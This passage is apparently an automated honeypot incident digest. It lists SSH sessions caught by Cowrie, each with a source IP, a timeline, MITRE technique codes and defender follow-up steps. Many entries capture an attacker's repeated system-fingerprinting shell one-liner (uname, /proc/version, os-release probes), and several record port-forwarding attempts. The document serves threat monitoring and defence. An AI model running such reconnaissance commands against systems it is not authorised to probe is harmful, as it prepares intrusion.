| `2026-08-15 19:23:41` | `cowrie.session.params` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.success` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.command.input` |
| `2026-08-15 19:23:41` | `cowrie.log.closed` |
| `2026-08-15 19:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b207d49f83bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:25 |
| **Last Seen** | 2026-08-15 19:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:25:22` | `cowrie.session.connect` |
| `2026-08-15 19:25:22` | `cowrie.client.version` |
| `2026-08-15 19:25:22` | `cowrie.client.kex` |
| `2026-08-15 19:25:23` | `cowrie.login.success` |
| `2026-08-15 19:25:24` | `cowrie.session.params` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.success` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:24` | `cowrie.command.input` |
| `2026-08-15 19:25:25` | `cowrie.command.input` |
| `2026-08-15 19:25:25` | `cowrie.log.closed` |
| `2026-08-15 19:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d6a38038c2f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:27 |
| **Last Seen** | 2026-08-15 19:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:27:00` | `cowrie.session.connect` |
| `2026-08-15 19:27:00` | `cowrie.client.version` |
| `2026-08-15 19:27:00` | `cowrie.client.kex` |
| `2026-08-15 19:27:01` | `cowrie.login.success` |
| `2026-08-15 19:27:02` | `cowrie.session.params` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.success` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.command.input` |
| `2026-08-15 19:27:03` | `cowrie.log.closed` |
| `2026-08-15 19:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ac88c914d3

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-15 19:27 |
| **Last Seen** | 2026-08-15 19:28 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:27:47` | `cowrie.session.connect` |
| `2026-08-15 19:27:47` | `cowrie.client.version` |
| `2026-08-15 19:28:26` | `cowrie.client.kex` |
| `2026-08-15 19:28:26` | `cowrie.login.success` |
| `2026-08-15 19:28:27` | `cowrie.session.params` |
| `2026-08-15 19:28:27` | `cowrie.command.input` |
| `2026-08-15 19:28:27` | `cowrie.log.closed` |
| `2026-08-15 19:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d0f3da3027

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:28 |
| **Last Seen** | 2026-08-15 19:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:28:40` | `cowrie.session.connect` |
| `2026-08-15 19:28:40` | `cowrie.client.version` |
| `2026-08-15 19:28:40` | `cowrie.client.kex` |
| `2026-08-15 19:28:41` | `cowrie.login.success` |
| `2026-08-15 19:28:42` | `cowrie.session.params` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.success` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:42` | `cowrie.command.input` |
| `2026-08-15 19:28:43` | `cowrie.log.closed` |
| `2026-08-15 19:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849f45d9e3ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:30 |
| **Last Seen** | 2026-08-15 19:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:30:30` | `cowrie.session.connect` |
| `2026-08-15 19:30:30` | `cowrie.client.version` |
| `2026-08-15 19:30:30` | `cowrie.client.kex` |
| `2026-08-15 19:30:30` | `cowrie.login.success` |
| `2026-08-15 19:30:32` | `cowrie.session.params` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.success` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.command.input` |
| `2026-08-15 19:30:32` | `cowrie.log.closed` |
| `2026-08-15 19:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14dfe3d071e1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:32 |
| **Last Seen** | 2026-08-15 19:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:32:18` | `cowrie.session.connect` |
| `2026-08-15 19:32:19` | `cowrie.client.version` |
| `2026-08-15 19:32:19` | `cowrie.client.kex` |
| `2026-08-15 19:32:19` | `cowrie.login.success` |
| `2026-08-15 19:32:21` | `cowrie.session.params` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.success` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.command.input` |
| `2026-08-15 19:32:21` | `cowrie.log.closed` |
| `2026-08-15 19:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2047da7590f8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-08-15 19:32 |
| **Last Seen** | 2026-08-15 19:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:32:38` | `cowrie.session.connect` |
| `2026-08-15 19:32:38` | `cowrie.client.version` |
| `2026-08-15 19:32:38` | `cowrie.client.kex` |
| `2026-08-15 19:32:39` | `cowrie.login.success` |
| `2026-08-15 19:32:40` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9262d60ae7

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-08-15 19:32 |
| **Last Seen** | 2026-08-15 19:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:32:45` | `cowrie.session.connect` |
| `2026-08-15 19:32:46` | `cowrie.client.version` |
| `2026-08-15 19:32:46` | `cowrie.client.kex` |
| `2026-08-15 19:32:48` | `cowrie.login.success` |
| `2026-08-15 19:32:49` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c9aa508706

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 19:32 |
| **Last Seen** | 2026-08-15 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:32:59` | `cowrie.session.connect` |
| `2026-08-15 19:32:59` | `cowrie.client.version` |
| `2026-08-15 19:33:00` | `cowrie.client.kex` |
| `2026-08-15 19:33:00` | `cowrie.login.success` |
| `2026-08-15 19:33:01` | `cowrie.session.params` |
| `2026-08-15 19:33:01` | `cowrie.command.input` |
| `2026-08-15 19:33:01` | `cowrie.log.closed` |
| `2026-08-15 19:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df0e0c3d06a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:34 |
| **Last Seen** | 2026-08-15 19:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:34:09` | `cowrie.session.connect` |
| `2026-08-15 19:34:09` | `cowrie.client.version` |
| `2026-08-15 19:34:09` | `cowrie.client.kex` |
| `2026-08-15 19:34:10` | `cowrie.login.success` |
| `2026-08-15 19:34:11` | `cowrie.session.params` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.success` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.command.input` |
| `2026-08-15 19:34:11` | `cowrie.log.closed` |
| `2026-08-15 19:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca1c28d44f0

| Field | Detail |
|---|---|
| **Source IP** | `195.218.159[.]123` |
| **First Seen** | 2026-08-15 19:35 |
| **Last Seen** | 2026-08-15 19:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:35:07` | `cowrie.session.connect` |
| `2026-08-15 19:35:08` | `cowrie.client.version` |
| `2026-08-15 19:35:08` | `cowrie.client.kex` |
| `2026-08-15 19:35:09` | `cowrie.login.success` |
| `2026-08-15 19:35:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.218.159[.]123` to AbuseIPDB if not already reported
- [ ] Block `195.218.159[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed582538b5ce

| Field | Detail |
|---|---|
| **Source IP** | `178.132.144[.]161` |
| **First Seen** | 2026-08-15 19:35 |
| **Last Seen** | 2026-08-15 19:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:35:15` | `cowrie.session.connect` |
| `2026-08-15 19:35:15` | `cowrie.client.version` |
| `2026-08-15 19:35:15` | `cowrie.client.kex` |
| `2026-08-15 19:35:16` | `cowrie.login.success` |
| `2026-08-15 19:35:17` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.132.144[.]161` to AbuseIPDB if not already reported
- [ ] Block `178.132.144[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b48ec923369

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:35 |
| **Last Seen** | 2026-08-15 19:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:35:59` | `cowrie.session.connect` |
| `2026-08-15 19:35:59` | `cowrie.client.version` |
| `2026-08-15 19:35:59` | `cowrie.client.kex` |
| `2026-08-15 19:36:00` | `cowrie.login.success` |
| `2026-08-15 19:36:02` | `cowrie.session.params` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.success` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:02` | `cowrie.command.input` |
| `2026-08-15 19:36:03` | `cowrie.log.closed` |
| `2026-08-15 19:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6aeb78806c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 19:37 |
| **Last Seen** | 2026-08-15 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:37:37` | `cowrie.session.connect` |
| `2026-08-15 19:37:37` | `cowrie.client.version` |
| `2026-08-15 19:37:37` | `cowrie.client.kex` |
| `2026-08-15 19:37:37` | `cowrie.login.success` |
| `2026-08-15 19:37:37` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:37:37` | `cowrie.direct-tcpip.data` |
| `2026-08-15 19:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6058e275ecfd

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-08-15 19:37 |
| **Last Seen** | 2026-08-15 19:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:37:37` | `cowrie.session.connect` |
| `2026-08-15 19:37:38` | `cowrie.client.version` |
| `2026-08-15 19:37:38` | `cowrie.client.kex` |
| `2026-08-15 19:37:40` | `cowrie.login.success` |
| `2026-08-15 19:37:40` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5142310125

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:37 |
| **Last Seen** | 2026-08-15 19:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:37:41` | `cowrie.session.connect` |
| `2026-08-15 19:37:41` | `cowrie.client.version` |
| `2026-08-15 19:37:41` | `cowrie.client.kex` |
| `2026-08-15 19:37:43` | `cowrie.login.success` |
| `2026-08-15 19:37:44` | `cowrie.session.params` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.success` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:44` | `cowrie.command.input` |
| `2026-08-15 19:37:45` | `cowrie.log.closed` |
